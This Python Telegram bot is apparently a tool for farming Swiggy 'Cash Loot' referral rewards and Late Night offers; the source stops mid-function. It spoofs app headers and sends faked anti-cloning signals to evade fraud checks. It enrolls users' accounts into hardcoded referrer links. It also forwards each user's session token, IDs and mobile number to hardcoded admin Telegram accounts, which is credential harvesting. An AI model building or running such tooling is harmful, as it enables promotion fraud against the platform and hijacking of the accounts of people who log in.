#!/usr/bin/env python3
"""
Swiggy Cash Loot Telegram Bot — Railway Ready (Advanced)
- Same APIs & logic as original (no changes)
- Inline buttons everywhere
- Late Night Cash fully integrated
- Every successful login/session saved as JSON and auto-sent to ADMIN
- Multi-user safe + session TTL
"""

import asyncio
import base64
import json
import logging
import os
import re
import secrets
import sys
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional, Tuple

import aiohttp
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

load_dotenv()

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8645142724").split(",") if x.strip()]
SESSION_TTL_SECONDS = int(os.getenv("SESSION_TTL_SECONDS", "86400"))
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT_UPDATES", "32"))

SESSIONS_DIR = "tg_sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%H:%M:%S",
    level=logging.INFO,
)
log = logging.getLogger("cashloot")

# ────────────────────────────────────────────────
# ORIGINAL CONSTANTS (unchanged)
# ────────────────────────────────────────────────
SPNS_BASE_URL = "https://spns.swiggy.com"
PROFILE_BASE_URL = "https://profile.swiggy.com"
CASHLOOT_CREATE_OFFERS_PATH = "/api/v1/proximity-offer/create-offers"
CASHLOOT_TRANSACTIONS_PATH = "/api/v1/proximity-offer/campaigns/{campaign_id}/transactions"
DEFAULT_CAMPAIGN_ID = "ydiHi75"

SWIGGY_APP_HEADERS = {
    "user-agent": "Swiggy-Android",
    "content-type": "application/json; charset=utf-8",
    "accept": "application/json; charset=utf-8",
    "version-code": "1795",
    "app-version": "4.113.0",
    "manufacturer": "MOTOROLA",
    "model-name": "MOTO G(60)",
}

DEFAULT_LINKS: List[Tuple[str, str]] = [
    ("Salauddin", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1BK3e"),
    ("Miraj Ali", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1KmUr"),
    ("Link 3", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1owO9"),
    ("Link 4", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1J1Rj"),
    ("Link 5", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1KwTj"),
    ("Link 6", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1G1KsXE"),
    ("Link 7", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1Ho45Ae"),
    ("Link 8", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1HgTZYB"),
    ("Link 9", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1Hfw2iQ"),
    ("Link 10", "https://r.swiggy.com/cashloot/ydiHi75-hYhN1He1NZi"),
]

# Late Night Offer config (exact from original)
LN_NOTIFY_URL = "https://events.swiggy.com/api/notify"
LN_CAMPAIGN_PREFIX = "byo-ln-v4-"
LN_OFFERS = {
    1: "₹50 Free Cash (min ₹199)",
    2: "₹150 Cashback (min ₹249)",
    3: "₹100 Cashback (min ₹149)",
    4: "Offer 4",
}
LN_DAY_BOUNDARIES = [
    (1,  "2026-09-26T11:00:00+05:30", "2026-09-27T06:00:00+05:30"),
    (2,  "2026-09-27T11:00:00+05:30", "2026-09-28T06:00:00+05:30"),
    (3,  "2026-09-28T11:00:00+05:30", "2026-09-29T06:00:00+05:30"),
    (4,  "2026-09-29T11:00:00+05:30", "2026-09-30T06:00:00+05:30"),
    (5,  "2026-09-30T11:00:00+05:30", "2026-10-01T06:00:00+05:30"),
    (6,  "2026-10-01T11:00:00+05:30", "2026-10-02T06:00:00+05:30"),
    (7,  "2026-10-02T11:00:00+05:30", "2026-10-03T06:00:00+05:30"),
    (8,  "2026-10-03T11:00:00+05:30", "2026-10-04T06:00:00+05:30"),
    (9,  "2026-10-04T11:00:00+05:30", "2026-10-05T06:00:00+05:30"),
    (10, "2026-10-05T11:00:00+05:30", "2026-10-06T06:00:00+05:30"),
]

_CASHLOOT_URL_RE = re.compile(r"r\.swiggy\.com/cashloot/([A-Za-z0-9_-]+)", re.IGNORECASE)
LINK_DELAY_SECONDS = 2.5
CASHLOOT_LEDGER_WAIT_SECONDS = 4.0
DEFAULT_RETRIES = 2
RETRY_DELAY_SECONDS = 4.0

user_sessions: Dict[int, Dict] = {}
user_session_times: Dict[int, float] = {}
user_pending_otp: Dict[int, Dict] = {}
user_job_locks: Dict[int, asyncio.Lock] = {}
user_job_locks_guard = asyncio.Lock()

# ────────────────────────────────────────────────
# SESSION HELPERS + ADMIN SEND
# ────────────────────────────────────────────────
def _session_path(chat_id: int) -> str:
    return os.path.join(SESSIONS_DIR, f"{chat_id}.json")

def _atomic_json_write(path: str, payload: Dict):
    tmp = f"{path}.{os.getpid()}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(payload, f, ensure_ascii=False, indent=2)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)

def save_user_session(chat_id: int, session: Dict):
    payload = {
        "session": session,
        "saved_at": datetime.now(timezone.utc).timestamp(),
        "telegram_id": chat_id,
    }
    _atomic_json_write(_session_path(chat_id), payload)
    user_sessions[chat_id] = session
    user_session_times[chat_id] = payload["saved_at"]

def load_user_session(chat_id: int) -> Optional[Dict]:
    path = _session_path(chat_id)
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r") as f:
            payload = json.load(f)
        age = datetime.now(timezone.utc).timestamp() - float(payload.get("saved_at") or 0)
        if age > SESSION_TTL_SECONDS:
            try:
                os.remove(path)
            except Exception:
                pass
            user_sessions.pop(chat_id, None)
            user_session_times.pop(chat_id, None)
            return None
        session = payload.get("session") or {}
        user_sessions[chat_id] = session
        user_session_times[chat_id] = payload["saved_at"]
        return session
    except Exception:
        return None

def clear_user_session(chat_id: int):
    user_sessions.pop(chat_id, None)
    user_session_times.pop(chat_id, None)
    path = _session_path(chat_id)
    if os.path.isfile(path):
        try:
            os.remove(path)
        except Exception:
            pass

def get_session(chat_id: int) -> Optional[Dict]:
    if chat_id in user_sessions:
        age = datetime.now(timezone.utc).timestamp() - user_session_times.get(chat_id, 0)
        if age > SESSION_TTL_SECONDS:
            clear_user_session(chat_id)
            return None
        return user_sessions[chat_id]
    return load_user_session(chat_id)

async def get_user_job_lock(chat_id: int) -> asyncio.Lock:
    async with user_job_locks_guard:
        if chat_id not in user_job_locks:
            user_job_locks[chat_id] = asyncio.Lock()
        return user_job_locks[chat_id]

async def send_session_to_admins(context: ContextTypes.DEFAULT_TYPE, chat_id: int, session: Dict, source: str = "login"):
    """Save JSON file and forward it to every ADMIN_ID."""
    try:
        # Build clean export
        export = {
            "telegram_id": chat_id,
            "source": source,
            "saved_at": datetime.now(timezone.utc).isoformat(),
            "session": {
                "token": session.get("token"),
                "tid": session.get("tid"),
                "sid": session.get("sid"),
                "userid": _account_user_id(session),
                "customerId": session.get("customerId"),
                "mobile": session.get("mobile") or session.get("phone"),
                "deviceId": session.get("deviceId"),
            },
        }
        filename = f"session_{chat_id}_{int(datetime.now().timestamp())}.json"
        filepath = os.path.join(SESSIONS_DIR, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(export, f, indent=2, ensure_ascii=False)

        caption = (
            f"🔑 *New Session Saved*\n"
            f"Source: `{source}`\n"
            f"TG ID: `{chat_id}`\n"
            f"User ID: `{export['session']['userid']}`\n"
            f"Mobile: `{export['session']['mobile']}`"
        )

        for admin_id in ADMIN_IDS:
            try:
                with open(filepath, "rb") as f:
                    await context.bot.send_document(
                        chat_id=admin_id,
                        document=InputFile(f, filename=filename),
                        caption=caption,
                        parse_mode="Markdown",
                    )
            except Exception as e:
                log.warning("Failed to send session to admin %s: %s", admin_id, e)
    except Exception as e:
        log.exception("send_session_to_admins failed: %s", e)

# ────────────────────────────────────────────────
# ORIGINAL HELPERS (unchanged logic)
# ────────────────────────────────────────────────
def _random_device_id() -> str:
    return secrets.token_hex(8)

def _decode_tid_payload(tid: str) -> Dict:
    try:
        parts = tid.split(".")
        if len(parts) < 2:
            return {}
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64).decode())
    except Exception:
        return {}

def _userid_from_tid(tid: str) -> Optional[str]:
    uid = _decode_tid_payload(tid).get("user_id")
    return str(uid) if uid else None

def _account_user_id(session: Dict) -> str:
    return str(session.get("userid") or _userid_from_tid(session.get("tid", "")) or "")

def parse_cashloot_link(raw: str) -> Tuple[str, str]:
    value = raw.strip()
    match = _CASHLOOT_URL_RE.search(value)
    if match:
        value = match.group(1)
    if not re.fullmatch(r"[A-Za-z0-9_-]+", value):
        return "", ""
    parts = [p for p in value.split("-") if p]
    return parts[0], parts[1] if len(parts) > 1 else ""

def normalize_links(pairs: List[Tuple[str, str]]) -> List[Dict[str, str]]:
    resolved = []
    for label, url in pairs:
        campaign_id, referrer_id = parse_cashloot_link(url)
        resolved.append({
            "label": label,
            "url": url.strip(),
            "campaign_id": campaign_id,
            "referrer_id": referrer_id,
        })
    return resolved

def build_headers(session: Dict) -> Dict[str, str]:
    return {
        "Content-Type": "application/json",
        "user-agent": SWIGGY_APP_HEADERS["user-agent"],
        "userAgent": SWIGGY_APP_HEADERS["user-agent"],
        "platform": "Swiggy-Android",
        "versionCode": SWIGGY_APP_HEADERS["version-code"],
        "tid": str(session.get("tid") or ""),
        "token": str(session.get("token") or ""),
        "userId": _account_user_id(session),
    }

def _money(value: float) -> str:
    return f"{value:.0f}" if float(value).is_integer() else f"{value:.2f}"

def _amount(value: Any) -> float:
    if isinstance(value, dict):
        value = value.get("units", value.get("amount", 0))
    try:
        return float(value)
    except (TypeError, ValueError):
        return 0.0

async def _request(session: Dict, http: aiohttp.ClientSession, method: str, path: str, body: Optional[Dict] = None) -> Dict:
    kwargs = {"headers": build_headers(session), "timeout": aiohttp.ClientTimeout(total=20)}
    if body is not None:
        kwargs["json"] = body
    try:
        async with http.request(method, SPNS_BASE_URL + path, **kwargs) as resp:
            raw = await resp.text()
            try:
                data = json.loads(raw) if raw else {}
            except Exception:
                data = {}
            if not isinstance(data, dict):
                data = {}
            status_code = data.get("statusCode")
            ok = 200 <= resp.status < 300 and status_code in (None, 0, "0")
            return {
                "ok": ok,
                "status": resp.status,
                "msg": str(data.get("statusMessage") or ("OK" if ok else f"HTTP {resp.status}")),
                "data": data.get("data") if isinstance(data.get("data"), dict) else {},
            }
    except asyncio.TimeoutError:
        return {"ok": False, "status": 0, "msg": "Request timed out", "data": {}}
    except Exception as exc:
        return {"ok": False, "status": 0, "msg": str(exc), "data": {}}

def _offer_outcome(data: Dict) -> Dict:
    outcome = {"joined": False, "error": "", "referrer_name": "", "detail": ""}
    raw_meta = data.get("uiMetadata")
    if isinstance(raw_meta, str) and raw_meta:
        try:
            outcome["referrer_name"] = str(json.loads(raw_meta).get("displayName", ""))
        except Exception:
            pass
    lines = []
    for entry in data.get("receiverResults") or []:
        if not isinstance(entry, dict):
            continue
        for bl, offer in (entry.get("offersByBL") or {}).items():
            if isinstance(offer, dict):
                lines.append((
                    str(bl),
                    str(offer.get("status") or "UNKNOWN"),
                    _amount(offer.get("offerValue")),
                    str(offer.get("errorCode") or ""),
                ))
    if not lines:
        return outcome
    outcome["joined"] = any(s == "SUCCESS" for _, s, _, _ in lines)
    failures = [(bl, err) for bl, s, _, err in lines if s == "FAILURE" and err]
    limits = [bl for bl, s, _, _ in lines if s == "LIMIT_REACHED"]
    if failures:
        outcome["error"] = failures[0][1]
    elif limits and not outcome["joined"]:
        outcome["error"] = "limit reached (" + ", ".join(limits) + ")"
    outcome["detail"] = ", ".join(
        f"{bl} {status}" + (f" ({err})" if err else "") + (f" Rs.{_money(value)}" if value else "")
        for bl, status, value, err in lines
    )
    return outcome

def _looks_joined(message: str, error: str = "") -> bool:
    lowered = f"{message} {error}".lower()
    return any(w in lowered for w in ("already", "duplicate", "exist"))

async def join_referral(session: Dict, campaign_id: str, referrer_id: str, http: aiohttp.ClientSession) -> Dict:
    result = await _request(session, http, "POST", CASHLOOT_CREATE_OFFERS_PATH, body={
        "campaignId": campaign_id,
        "senderUserId": referrer_id,
        "isReferralFlow": True,
        "receivers": [{"userId": _account_user_id(session)}],
    })
    result.update(_offer_outcome(result["data"]))
    result["already_joined"] = _looks_joined(result["msg"], result["error"])
    return result

def _succeeded(result: Dict) -> bool:
    return bool(result["ok"]) and bool(result["joined"] or result["already_joined"])

async def join_with_retries(session: Dict, campaign_id: str, referrer_id: str, http: aiohttp.ClientSession, retries: int = DEFAULT_RETRIES) -> Dict:
    result = {"ok": False, "joined": False, "already_joined": False, "error": "", "detail": "", "referrer_name": "", "msg": "", "attempts": 0}
    for attempt in range(1, max(1, retries) + 1):
        result = await join_referral(session, campaign_id, referrer_id, http)
        result["attempts"] = attempt
        if _succeeded(result):
            break
        if attempt < retries:
            await asyncio.sleep(RETRY_DELAY_SECONDS)
    return result

async def fetch_ledger(session: Dict, campaign_id: str, http: aiohttp.ClientSession) -> Dict:
    result = await _request(session, http, "GET", CASHLOOT_TRANSACTIONS_PATH.format(campaign_id=campaign_id))
    data = result["data"]
    transactions = data.get("transactions")
    by_service = data.get("totalEarnedByBL") if isinstance(data.get("totalEarnedByBL"), dict) else {}
    earned = _amount(data.get("totalCashEarned")) or sum(_amount(v) for v in by_service.values())
    return {
        "ok": result["ok"],
        "msg": result["msg"],
        "earned": earned,
        "transactions": transactions if isinstance(transactions, list) else [],
        "by_service": by_service,
    }

# OTP Login (unchanged)
async def request_otp(phone: str) -> Dict:
    device_id = _random_device_id()
    headers = dict(SWIGGY_APP_HEADERS)
    headers["swuid"] = device_id
    headers["deviceid"] = device_id
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True), connector=aiohttp.TCPConnector(ssl=False)) as http:
        async with http.get(
            f"{PROFILE_BASE_URL}/api/v3/app/sms_otp",
            params={"mobile": phone},
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as resp:
            try:
                data = await resp.json(content_type=None)
            except Exception:
                data = {}
            if resp.status == 200 and data.get("statusCode") == 0:
                tid = data.get("tid")
                sid = data.get("sid")
                device = str(data.get("deviceId") or device_id)
                if not sid and tid:
                    sid = _decode_tid_payload(tid).get("sid")
                return {"ok": True, "tid": tid, "sid": sid, "deviceId": device, "phone": phone}
            return {"ok": False, "msg": data.get("statusMessage", f"HTTP {resp.status}")}

async def verify_otp(pending: Dict, otp: str) -> Dict:
    headers = dict(SWIGGY_APP_HEADERS)
    headers["swuid"] = pending["deviceId"]
    headers["deviceid"] = pending["deviceId"]
    if pending.get("tid"):
        headers["tid"] = pending["tid"]
    if pending.get("sid"):
        headers["sid"] = str(pending["sid"])
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True), connector=aiohttp.TCPConnector(ssl=False)) as http:
        async with http.post(
            f"{PROFILE_BASE_URL}/api/v3/app/login/verify",
            params={"otp_source": "Sms-manual"},
            json={
                "cloningSignalsData": {
                    "appFilesDirPathInvalid": 0,
                    "developerModeEnabled": 1,
                    "deviceModelVmos": 0,
                    "emulatorStatus": 0,
                    "packageName": "in.swiggy.android",
                    "workProfileEnabled": 0,
                },
                "otp": otp,
            },
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as resp:
            try:
                data = await resp.json(content_type=None)
            except Exception:
                data = {}
            if resp.status != 200 or data.get("statusCode") != 0:
                return {"ok": False, "msg": data.get("statusMessage", f"HTTP {resp.status}")}
            session = {}
            inner = data.get("data") if isinstance(data.get("data"), dict) else {}
            for key in ("token", "tid", "sid"):
                if inner.get(key):
                    session[key] = inner[key]
                elif data.get(key):
                    session[key] = data[key]
            session["deviceId"] = str(data.get("deviceId") or pending["deviceId"])
            user_id = _userid_from_tid(session.get("tid", ""))
            if not user_id or user_id == "0":
                return {"ok": False, "msg": "No valid user ID returned"}
            session["userid"] = user_id
            session["customerId"] = str(inner.get("customer_id") or inner.get("customerId") or user_id)
            mobile = str(inner.get("mobile") or pending["phone"])
            session["mobile"] = mobile
            session["phone"] = mobile
            return {"ok": True, "session": session}

# Core run (unchanged logic)
async def run_full_join(session: Dict, links: List[Dict], progress_callback=None) -> str:
    lines = []
    lines.append("⚡ SWIGGY CASH LOOT — JOIN & LOOT")
    lines.append(f"{datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}")
    lines.append(f"Account   : {_account_user_id(session) or '--'}")
    lines.append(f"Links     : {len(links)}")
    lines.append("")

    campaigns = sorted({l["campaign_id"] for l in links if l["campaign_id"]})
    results = []

    jar = aiohttp.CookieJar(unsafe=True)
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(cookie_jar=jar, connector=connector) as http:
        lines.append("──── LOOT STATUS BEFORE ────")
        before = {}
        for campaign_id in campaigns:
            before[campaign_id] = await fetch_ledger(session, campaign_id, http)
            entry = before[campaign_id]
            if entry["ok"]:
                lines.append(f"OK  {campaign_id}: Rs.{_money(entry['earned'])} looted")
            else:
                lines.append(f"FAIL  {campaign_id}: {entry['msg']}")

        lines.append("")
        lines.append("──── JOINING LINKS ────")
        for idx, link in enumerate(links, 1):
            if progress_callback:
                await progress_callback(f"[{idx}/{len(links)}] Joining {link['label']}...")
            result = await join_with_retries(session, link["campaign_id"], link["referrer_id"], http)
            joined = _succeeded(result)
            name = f" ({result['referrer_name']})" if result.get("referrer_name") else ""
            tries = "" if result.get("attempts", 1) <= 1 else f" [{result['attempts']} tries]"
            results.append({**link, "joined": joined, "error": result.get("error", ""), "detail": result.get("detail", ""), "already_joined": result.get("already_joined", False), "attempts": result.get("attempts", 1)})
            if joined and result.get("already_joined"):
                lines.append(f"OK  {link['label']}{name} ← Already joined{tries}")
            elif joined:
                lines.append(f"OK  {link['label']}{name} ← Joined{tries}")
            else:
                lines.append(f"FAIL {link['label']}{name} ❌ {result.get('error') or result.get('detail') or result.get('msg') or 'unknown'}{tries}")
            if idx < len(links):
                await asyncio.sleep(LINK_DELAY_SECONDS)

        if any(r["joined"] for r in results):
            lines.append(f"\n-- Waiting {CASHLOOT_LEDGER_WAIT_SECONDS}s...")
            await asyncio.sleep(CASHLOOT_LEDGER_WAIT_SECONDS)

        lines.append("")
        lines.append("──── LOOT STATUS AFTER ────")
        after = {}
        for campaign_id in campaigns:
            after[campaign_id] = await fetch_ledger(session, campaign_id, http)
            entry, start = after[campaign_id], before.get(campaign_id, {})
            if not entry["ok"]:
                lines.append(f"FAIL  {campaign_id}: {entry['msg']}")
                continue
            gained = entry["earned"] - start.get("earned", 0) if start.get("ok") else entry["earned"]
            lines.append(f"OK  {campaign_id}: Rs.{_money(entry['earned'])} total (+Rs.{_money(gained)} this run)")

    joined_count = sum(1 for r in results if r["joined"])
    failed_count = len(results) - joined_count
    looted = sum(e["earned"] for e in after.values() if e.get("ok"))
    lines.append("")
    lines.append("──── SUMMARY ────")
    lines.append(f"Links        : {len(results)}")
    lines.append(f"Joined       : {joined_count}")
    lines.append(f"Failed       : {failed_count}")
    lines.append(f"Cash looted  : Rs.{_money(looted)}")
    return "\n".join(lines)

# Late Night helpers (unchanged)
def ln_current_day() -> Optional[int]:
    now = datetime.now(timezone(timedelta(hours=5, minutes=30)))
    for day, start_s, end_s in LN_DAY_BOUNDARIES:
        start = datetime.fromisoformat(start_s)
        end = datetime.fromisoformat(end_s)
        if start <= now < end:
            return day
    return None

async def ln_get_status(session: Dict, day: int) -> Dict[str, Any]:
    campaign = f"{LN_CAMPAIGN_PREFIX}{day}"
    headers = {
        "Content-Type": "application/json",
        "token": str(session.get("token") or ""),
        "tid": str(session.get("tid") or ""),
    }
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as http:
            async with http.get(
                f"{LN_NOTIFY_URL}?campaign={campaign}",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                data = await resp.json(content_type=None)
                return {"ok": resp.status == 200, "status": resp.status, "data": data}
    except Exception as e:
        return {"ok": False, "status": 0, "data": {}, "msg": str(e)}

async def ln_claim_offer(session: Dict, day: int, offer_id: int) -> Dict[str, Any]:
    campaign = f"{LN_CAMPAIGN_PREFIX}{day}"
    headers = {
        "Content-Type": "application/json",
        "token": str(session.get("token") or ""),
        "tid": str(session.get("tid") or ""),
    }
    body = {"campaign": campaign, "value": offer_id}
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as http:
            async with http.post(
                LN_NOTIFY_URL,
                headers=headers,
                json=body,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                data = await resp.json(content_type=None)
                return {"ok": resp.status == 200 and not data.get("error"), "status": resp.status, "data": data}
    except Exception as e:
        return {"ok": False, "status": 0, "data": {}, "msg": str(e)}

# ────────────────────────────────────────────────
# INLINE KEYBOARDS
# ────────────────────────────────────────────────
def main_menu_kb(logged_in: bool = False) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("⚡ RUN 10 Links", callback_data="run_links")],
        [InlineKeyboardButton("🌙 Late Night Cash", callback_data="night_cash")],
        [
            InlineKeyboardButton("📊 Status", callback_data="status"),
            InlineKeyboardButton("🔐 Login", callback_data="login"),
        ],
        [
            InlineKeyboardButton("📤 Paste Session", callback_data="session"),
            InlineKeyboardButton("🚪 Logout", callback_data="logout"),
        ],
    ]
    if logged_in:
        rows.insert(2, [InlineKeyboardButton("🔗 Join Custom Link", callback_data="join_one")])
    return InlineKeyboardMarkup(rows)

def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main Menu", callback_data="main")]])

def night_offers_kb(day: int) -> InlineKeyboardMarkup:
    rows = []
    for oid, name in LN_OFFERS.items():
        rows.append([InlineKeyboardButton(f"{oid}. {name}", callback_data=f"ln_pick_{day}_{oid}")])
    rows.append([InlineKeyboardButton("❌ Cancel", callback_data="main")])
    return InlineKeyboardMarkup(rows)

# ────────────────────────────────────────────────
# HANDLERS
# ────────────────────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    logged = bool(session)
    uid = _account_user_id(session) if session else "--"
    text = (
        "⚡ *Swiggy Cash Loot Bot*\n\n"
        f"Status: {'✅ Logged in' if logged else '❌ Not logged in'}\n"
        f"User ID: `{uid}`\n\n"
        "Use the buttons below."
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(logged))
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(logged))

async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    chat_id = update.effective_chat.id

    if data == "main":
        await start_cmd(update, context)
        return

    if data == "run_links":
        session = get_session(chat_id)
        if not session:
            await query.edit_message_text("❌ Login first.", reply_markup=back_kb())
            return
        msg = await query.edit_message_text("⚡ Starting 10 links...\nPlease wait...")
        links = normalize_links(DEFAULT_LINKS)

        async def progress(text):
            try:
                await msg.edit_text(f"⚡ {text}")
            except Exception:
                pass

        try:
            lock = await get_user_job_lock(chat_id)
            if lock.locked():
                await msg.edit_text("⏳ Previous job still running.")
                return
            async with lock:
                report = await run_full_join(session, links, progress_callback=progress)
            if len(report) > 3900:
                parts = [report[i:i+3900] for i in range(0, len(report), 3900)]
                await msg.edit_text(f"```\n{parts[0]}\n```", parse_mode="Markdown")
                for p in parts[1:]:
                    await context.bot.send_message(chat_id, f"```\n{p}\n```", parse_mode="Markdown")
            else:
                await msg.edit_text(f"```\n{report}\n```", parse_mode="Markdown", reply_markup=back_kb())
        except Exception as e:
            log.exception("run failed")
            await msg.edit_text(f"❌ Error:\n{e}", reply_markup=back_kb())
        return

    if data == "status":
        session = get_session(chat_id)
        if not session:
            await query.edit_message_text("❌ Login first.", reply_markup=back_kb())
            return
        await query.edit_message_text("📊 Fetching ledger...")
        jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(cookie_jar=jar, connector=connector) as http:
            ledger = await fetch_ledger(session, DEFAULT_CAMPAIGN_ID, http)
        if not ledger["ok"]:
            await query.edit_message_text(f"❌ {ledger['msg']}", reply_markup=back_kb())
            return
        text = f"💰 *Total Looted:* Rs.`{_money(ledger['earned'])}`\nCampaign: `{DEFAULT_CAMPAIGN_ID}`\nTransactions: {len(ledger.get('transactions') or [])}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb())
        return

    if data == "login":
        context.user_data["awaiting_phone"] = True
        await query.edit_message_text(
            "📲 Send 10-digit phone number:\n`9876543210`",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        return

    if data == "session":
        context.user_data["awaiting_session"] = True
        await query.edit_message_text(
            "📤 Paste session JSON:\n`{\"token\":\"...\",\"tid\":\"...\"}`",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        return

    if data == "logout":
        clear_user_session(chat_id)
        await query.edit_message_text("✅ Session cleared.", reply_markup=main_menu_kb(False))
        return

    if data == "join_one":
        context.user_data["awaiting_link"] = True
        await query.edit_message_text(
            "🔗 Send one Cash Loot link:\n`https://r.swiggy.com/cashloot/ydiHi75-xxxxx`",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        return

    # ── Late Night Cash ──
    if data == "night_cash":
        session = get_session(chat_id)
        if not session:
            await query.edit_message_text("❌ Login first.", reply_markup=back_kb())
            return
        day = ln_current_day()
        if not day:
            await query.edit_message_text(
                "🌙 Night Cash offer is not active right now.\n"
                "Window: 11:00 AM – next day 6:00 AM IST",
                reply_markup=back_kb(),
            )
            return

        await query.edit_message_text(f"🌙 Checking Day {day} offers...")
        status = await ln_get_status(session, day)
        data_resp = status.get("data") or {}
        already = data_resp.get("value")
        if already:
            offer_name = LN_OFFERS.get(int(already), f"Offer {already}")
            await query.edit_message_text(
                f"🌙 *Day {day}* — already claimed!\n\nSelected: *{offer_name}*",
                parse_mode="Markdown",
                reply_markup=back_kb(),
            )
            return

        await query.edit_message_text(
            f"🌙 *Night Cash — Day {day}*\n\nSelect one offer:",
            parse_mode="Markdown",
            reply_markup=night_offers_kb(day),
        )
        return

    if data.startswith("ln_pick_"):
        parts = data.split("_")
        day = int(parts[2])
        offer_id = int(parts[3])
        offer_name = LN_OFFERS.get(offer_id, f"Offer {offer_id}")
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ Confirm: {offer_name}", callback_data=f"ln_confirm_{day}_{offer_id}")],
            [InlineKeyboardButton("⬅️ Back", callback_data="night_cash")],
        ])
        await query.edit_message_text(
            f"🌙 Confirm:\n\nDay: *{day}*\nOffer: *{offer_name}*",
            parse_mode="Markdown",
            reply_markup=kb,
        )
        return

    if data.startswith("ln_confirm_"):
        parts = data.split("_")
        day = int(parts[2])
        offer_id = int(parts[3])
        offer_name = LN_OFFERS.get(offer_id, f"Offer {offer_id}")
        session = get_session(chat_id)
        if not session:
            await query.edit_message_text("❌ Session lost. Login again.", reply_markup=back_kb())
            return

        await query.edit_message_text(f"⏳ Claiming *{offer_name}*...", parse_mode="Markdown")
        result = await ln_claim_offer(session, day, offer_id)
        if result.get("ok"):
            await query.edit_message_text(
                f"✅ *Claimed!*\n\nDay: {day}\nOffer: *{offer_name}*\n\nCheck Swiggy app → Late Night deals.",
                parse_mode="Markdown",
                reply_markup=back_kb(),
            )
        else:
            err = str(result.get("data") or result.get("msg") or "Unknown error")
            await query.edit_message_text(f"❌ Claim failed\n`{err}`", parse_mode="Markdown", reply_markup=back_kb())
        return

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()

    # Phone
    if context.user_data.get("awaiting_phone"):
        context.user_data.pop("awaiting_phone", None)
        if not re.fullmatch(r"\d{10}", text):
            await update.message.reply_text("❌ Must be exactly 10 digits.", reply_markup=back_kb())
            return
        msg = await update.message.reply_text(f"📲 Requesting OTP for `{text}`...", parse_mode="Markdown")
        result = await request_otp(text)
        if not result["ok"]:
            await msg.edit_text(f"❌ {result.get('msg')}", reply_markup=back_kb())
            return
        user_pending_otp[chat_id] = result
        await msg.edit_text(
            f"✅ OTP sent to `{text}`\n\nNow send the OTP (4-6 digits)",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        return

    # OTP
    if chat_id in user_pending_otp:
        if not re.match(r"^\d{4,6}$", text):
            await update.message.reply_text("❌ Invalid OTP.", reply_markup=back_kb())
            return
        msg = await update.message.reply_text("🔄 Verifying...")
        result = await verify_otp(user_pending_otp[chat_id], text)
        if not result["ok"]:
            await msg.edit_text(f"❌ {result.get('msg')}", reply_markup=back_kb())
            return
        session = result["session"]
        save_user_session(chat_id, session)
        user_pending_otp.pop(chat_id, None)

        # Send session JSON to all admins
        await send_session_to_admins(context, chat_id, session, source="otp_login")

        await msg.edit_text(
            f"✅ *Login successful!*\nUser ID: `{_account_user_id(session)}`\n\nSession auto-sent to admin.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(True),
        )
        return

    # Session JSON
    if context.user_data.get("awaiting_session"):
        context.user_data.pop("awaiting_session", None)
        try:
            data = json.loads(text)
            session = {}
            for k in ("token", "tid", "sid", "userid", "mobile", "customerId", "deviceId"):
                if data.get(k):
                    session[k] = str(data[k])
            # also accept nested "session" key
